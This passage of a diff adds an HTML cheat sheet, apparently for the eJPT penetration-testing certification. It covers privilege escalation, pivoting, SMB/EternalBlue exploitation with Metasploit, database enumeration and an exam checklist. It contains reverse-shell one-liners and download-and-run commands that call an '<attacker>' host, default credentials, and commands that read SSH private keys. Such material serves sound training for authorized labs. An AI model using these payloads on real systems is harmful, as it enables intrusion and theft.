+        <div class="note note-orange">Look up any SUID binary on <strong>gtfobins.github.io</strong> for exploitation technique.</div>
+
+        <div class="section-label">Cron Jobs &amp; Scheduled Tasks</div>
+        <code class="cmd">cat /etc/crontab</code>
+        <code class="cmd">crontab -l</code>
+        <code class="cmd">ls -la /etc/cron*</code>
+        <code class="cmd">cat /var/spool/cron/crontabs/*</code>
+
+        <div class="section-label">Writable Files &amp; Paths</div>
+        <code class="cmd">find / -writable -type f 2&gt;/dev/null | grep -v proc</code>
+        <code class="cmd">echo $PATH</code>
+
+        <div class="section-label">Windows PrivEsc</div>
+        <code class="cmd">whoami /priv</code>
+        <code class="cmd">whoami /groups</code>
+        <code class="cmd">net users</code>
+        <code class="cmd">net localgroup administrators</code>
+        <code class="cmd">systeminfo</code>
+
+        <div class="section-label">Automated PrivEsc Tools</div>
+        <div class="tags">
+          <span class="tag tag-red">LinPEAS</span>
+          <span class="tag tag-red">WinPEAS</span>
+          <span class="tag tag-orange">LinEnum</span>
+          <span class="tag tag-orange">linux-exploit-suggester</span>
+          <span class="tag tag-blue">PowerUp.ps1</span>
+          <span class="tag tag-navy">GTFOBins</span>
+        </div>
+        <code class="cmd">run post/multi/recon/local_exploit_suggester</code>
+      </div>
+    </div>
+
+    <!-- Pivoting -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-purple">&#128257;</div>
+        <h2>Pivoting</h2>
+        <span class="sub">Lateral movement &amp; tunneling</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Metasploit Route-Based Pivot</div>
+        <code class="cmd">route add 192.168.2.0/24 &lt;session_id&gt;</code>
+        <code class="cmd">route print</code>
+        <code class="cmd">route remove 192.168.2.0/24 &lt;session_id&gt;</code>
+        <div class="note note-blue">After adding route, Metasploit modules can reach the internal network through the session.</div>
+
+        <div class="section-label">Socks Proxy via Metasploit</div>
+        <code class="cmd">use auxiliary/server/socks_proxy</code>
+        <code class="cmd">set SRVPORT 9050</code>
+        <code class="cmd">set VERSION 5</code>
+        <code class="cmd">run -j</code>
+        <code class="cmd">proxychains nmap -sT -p 80,443 192.168.2.&lt;x&gt;</code>
+        <code class="cmd">proxychains curl http://192.168.2.10</code>
+
+        <div class="section-label">SSH Port Forwarding</div>
+        <code class="cmd">ssh -L &lt;local_port&gt;:&lt;target&gt;:&lt;remote_port&gt; user@&lt;pivot&gt;</code>
+        <code class="cmd">ssh -L 3306:192.168.2.10:3306 user@pivot</code>
+        <code class="cmd">ssh -D 9050 user@&lt;pivot&gt;</code>
+        <code class="cmd">ssh -R 4444:localhost:4444 user@pivot</code>
+
+        <div class="section-label">proxychains Config</div>
+        <code class="cmd">cat /etc/proxychains.conf</code>
+        <div class="note note-orange">Set <code style="font-family:var(--mono);">socks5 127.0.0.1 9050</code> at the bottom of proxychains.conf. Comment out other proxy lines.</div>
+
+        <div class="section-label">Netcat / Chisel Tunneling</div>
+        <code class="cmd">nc -lvnp 4444</code>
+        <code class="cmd">chisel server -p 8080 --reverse</code>
+        <code class="cmd">chisel client &lt;attacker&gt;:8080 R:9050:socks</code>
+
+        <div class="section-label">Meterpreter Port Forward</div>
+        <code class="cmd">portfwd add -l 4444 -p 4444 -r &lt;internal-host&gt;</code>
+        <code class="cmd">portfwd list</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW 5: Quick References -->
+  <div class="grid grid-2">
+
+    <!-- Reverse Shells -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-red">&#128032;</div>
+        <h2>Reverse Shells</h2>
+        <span class="sub">One-liners for initial access</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Listener (Attacker Side)</div>
+        <code class="cmd">nc -lvnp 4444</code>
+        <code class="cmd">rlwrap nc -lvnp 4444</code>
+
+        <div class="section-label">Bash</div>
+        <code class="cmd">bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1</code>
+
+        <div class="section-label">Python</div>
+        <code class="cmd">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;attacker&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'</code>
+
+        <div class="section-label">PHP</div>
+        <code class="cmd">php -r '$s=fsockopen("&lt;attacker&gt;",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>
+
+        <div class="section-label">Netcat</div>
+        <code class="cmd">nc -e /bin/sh &lt;attacker&gt; 4444</code>
+        <code class="cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attacker&gt; 4444 &gt;/tmp/f</code>
+
+        <div class="section-label">Stabilise Shell (TTY)</div>
+        <code class="cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
+        <code class="cmd">export TERM=xterm</code>
+        <div class="note note-blue">Then press <strong>Ctrl+Z</strong>, run <code style="font-family:var(--mono);">stty raw -echo; fg</code>, hit Enter twice.</div>
+      </div>
+    </div>
+
+    <!-- File Transfer + Useful Linux Commands -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-navy">&#128193;</div>
+        <h2>File Transfer &amp; Recon</h2>
+        <span class="sub">Move files &amp; gather info</span>
+      </div>
+      <div class="card-body">
+        <div class="two-col">
+          <div>
+            <div class="section-label">File Transfer — Attacker</div>
+            <code class="cmd">python3 -m http.server 8000</code>
+            <code class="cmd">php -S 0.0.0.0:8000</code>
+            <code class="cmd">updog</code>
+
+            <div class="section-label">File Transfer — Target (Linux)</div>
+            <code class="cmd">wget http://&lt;attacker&gt;:8000/shell.elf</code>
+            <code class="cmd">curl -O http://&lt;attacker&gt;:8000/shell.elf</code>
+            <code class="cmd">chmod +x shell.elf && ./shell.elf</code>
+
+            <div class="section-label">File Transfer — Target (Windows)</div>
+            <code class="cmd">certutil -urlcache -f http://&lt;attacker&gt;:8000/shell.exe shell.exe</code>
+            <code class="cmd">powershell -c "Invoke-WebRequest http://&lt;attacker&gt;:8000/shell.exe -OutFile shell.exe"</code>
+          </div>
+          <div>
+            <div class="section-label">Linux Recon Commands</div>
+            <div class="row"><span class="key">ifconfig / ip a</span><span class="val">Interfaces</span></div>
+            <div class="row"><span class="key">netstat -tulnp</span><span class="val">Open ports</span></div>
+            <div class="row"><span class="key">ss -tulnp</span><span class="val">Socket stats</span></div>
+            <div class="row"><span class="key">ps aux</span><span class="val">Running processes</span></div>
+            <div class="row"><span class="key">env</span><span class="val">Environment vars</span></div>
+            <div class="row"><span class="key">history</span><span class="val">Bash history</span></div>
+            <div class="row"><span class="key">find / -name flag*</span><span class="val">Hunt for flags</span></div>
+            <div class="row"><span class="key">grep -r "flag" /</span><span class="val">Content search</span></div>
+            <div class="row"><span class="key">cat ~/.bash_history</span><span class="val">User history</span></div>
+            <div class="row"><span class="key">cat ~/.ssh/id_rsa</span><span class="val">SSH private key</span></div>
+
+            <div class="section-label">Common Flag Locations</div>
+            <div class="tags">
+              <span class="tag tag-red">/root/flag.txt</span>
+              <span class="tag tag-red">/home/user/flag.txt</span>
+              <span class="tag tag-navy">/var/www/html/flag.txt</span>
+              <span class="tag tag-navy">C:\Users\Admin\Desktop\flag.txt</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW 6: SMB Exploits + MySQL + Quick Wins -->
+  <div class="grid">
+
+    <!-- SMB / EternalBlue -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-red">&#128220;</div>
+        <h2>SMB &amp; EternalBlue</h2>
+        <span class="sub">MS17-010 / CVE-2017-0144</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">SMB Version Check</div>
+        <code class="cmd">nmap -p 445 --script=smb-vuln-ms17-010 &lt;target&gt;</code>
+        <code class="cmd">nmap -p 445 --script=smb2-security-mode &lt;target&gt;</code>
+
+        <div class="section-label">EternalBlue via Metasploit</div>
+        <code class="cmd">use exploit/windows/smb/ms17_010_eternalblue</code>
+        <code class="cmd">set RHOSTS &lt;target&gt;</code>
+        <code class="cmd">set LHOST &lt;attacker&gt;</code>
+        <code class="cmd">set payload windows/x64/meterpreter/reverse_tcp</code>
+        <code class="cmd">run</code>
+
+        <div class="section-label">SMB Enumeration</div>
+        <code class="cmd">enum4linux -a &lt;target&gt;</code>
+        <code class="cmd">smbmap -H &lt;target&gt;</code>
+        <code class="cmd">smbmap -H &lt;target&gt; -u user -p pass</code>
+        <code class="cmd">crackmapexec smb &lt;target&gt; -u user -p pass</code>
+        <code class="cmd">crackmapexec smb &lt;target&gt; --shares</code>
+        <div class="note note-red">EternalBlue affects unpatched Windows 7, 8, Server 2008/2012 — very common on eJPT labs.</div>
+      </div>
+    </div>
+
+    <!-- MySQL / Database Enumeration -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-blue">&#128451;</div>
+        <h2>Database Enumeration</h2>
+        <span class="sub">MySQL / PostgreSQL</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">MySQL (Port 3306)</div>
+        <code class="cmd">mysql -u root -h &lt;target&gt;</code>
+        <code class="cmd">mysql -u root -p -h &lt;target&gt;</code>
+        <code class="cmd">nmap --script=mysql-info -p 3306 &lt;target&gt;</code>
+        <code class="cmd">nmap --script=mysql-enum -p 3306 &lt;target&gt;</code>
+
+        <div class="section-label">MySQL Queries</div>
+        <code class="cmd">SHOW DATABASES;</code>
+        <code class="cmd">USE database_name;</code>
+        <code class="cmd">SHOW TABLES;</code>
+        <code class="cmd">SELECT * FROM users;</code>
+        <code class="cmd">SELECT user,password FROM mysql.user;</code>
+        <code class="cmd">LOAD DATA INFILE '/etc/passwd' INTO TABLE mytable;</code>
+
+        <div class="section-label">PostgreSQL (Port 5432)</div>
+        <code class="cmd">psql -U postgres -h &lt;target&gt;</code>
+        <code class="cmd">\l</code>
+        <code class="cmd">\c database_name</code>
+        <code class="cmd">\dt</code>
+        <code class="cmd">SELECT * FROM users;</code>
+
+        <div class="note note-blue">Default creds to try: root:(blank), root:root, admin:admin, postgres:postgres</div>
+      </div>
+    </div>
+
+    <!-- Quick Wins & Checklist -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-green">&#9989;</div>
+        <h2>Exam Checklist</h2>
+        <span class="sub">Don&apos;t miss these</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Recon &amp; Scan Phase</div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Run nmap host discovery on full subnet</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Full port scan every live host (-p-)</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Service version detection (-sV -sC)</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Save all nmap output (-oN scan.txt)</span></div>
+
+        <div class="section-label">Enumeration Phase</div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Try FTP anonymous login on port 21</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Enumerate SMB shares (enum4linux)</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Run dirb / gobuster on HTTP ports</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Check for default credentials</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Read source code of web pages</span></div>
+
+        <div class="section-label">Exploitation Phase</div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Search Metasploit for each service version</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Try SQLi on all login/search forms</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Brute-force SSH/FTP if creds not found</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Check vuln scripts: nmap --script=vuln</span></div>
+
+        <div class="section-label">Post-Exploitation Phase</div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Run hashdump in Meterpreter</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Check sudo -l for privilege paths</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Find SUID binaries, check GTFOBins</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">Add routes for internal networks</span></div>
+        <div class="row"><span class="key">&#9744;</span><span class="val">search flag.txt across all drives</span></div>
+
+        <div class="note note-green">Each flag = one answer. Partial credit is not given — get the full flag string exactly.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    eJPT v2 Cheat Sheet &mdash; IT University &bull; Reference only &mdash; for authorized lab environments &bull; eLearnSecurity / INE certification
+  </div>
+
+</div>
+</body>
+</html>
